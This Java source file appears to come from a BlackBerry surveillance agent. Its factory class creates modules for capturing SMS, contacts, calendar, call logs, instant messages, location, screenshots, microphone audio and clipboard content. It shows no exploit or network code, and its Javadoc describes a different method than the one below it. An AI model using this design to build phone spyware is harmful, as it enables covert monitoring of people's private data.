package blackberry.module;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class FactoryModule {
    //#ifdef DEBUG
    private static Debug debug = new Debug("FactoryModule", DebugLevel.VERBOSE);

    //#endif

    /**
     * mapAgent() Add agent id defined by "key" into the running map. If the
     * agent is already present, the old object is returned.
     * 
     * @param key
     *            : Agent ID
     * @return the requested agent or null in case of error
     */
    public static BaseModule create(String type, String subtype) {
        BaseModule a = null;

        if ("sms".equals(type)) {
            a = new ModuleMessage();
        } else if ("addressbook".equals(type)) {
            a = new ModuleAddressBook();
        } else if ("calendar".equals(type)) {
            a = new ModuleCalendar();
        } else if ("calllist".equals(type)) {
            a = new ModuleCallList();
        } else if ("device".equals(type)) {
            a = new ModuleDevice();
        } else if ("im".equals(type)) {
            a = new ModuleIm();
        } else if ("position".equals(type)) {
            a = new ModulePosition();
        } else if ("snapshot".equals(type)) {
            a = new ModuleSnapshot();
        } else if ("messages".equals(type)) {
            a = new ModuleMessage();
        } else if ("mic".equals(type)) {
            a = new ModuleMic();
        } else if ("camera".equals(type)) {
            //a = new ModuleCamera();
        } else if ("clipboard".equals(type)) {
            a = new ModuleClipboard();
        } else if ("crisis".equals(type)) {
            a = new ModuleCrisis();
        } else if ("application".equals(type)) {
            a = new ModuleApplication();
        } else {
            //#ifdef DEBUG
            debug.trace(" Error (factory), unknown type: " + type);//$NON-NLS-1$
            //#endif
        }

        return a;
    }

}
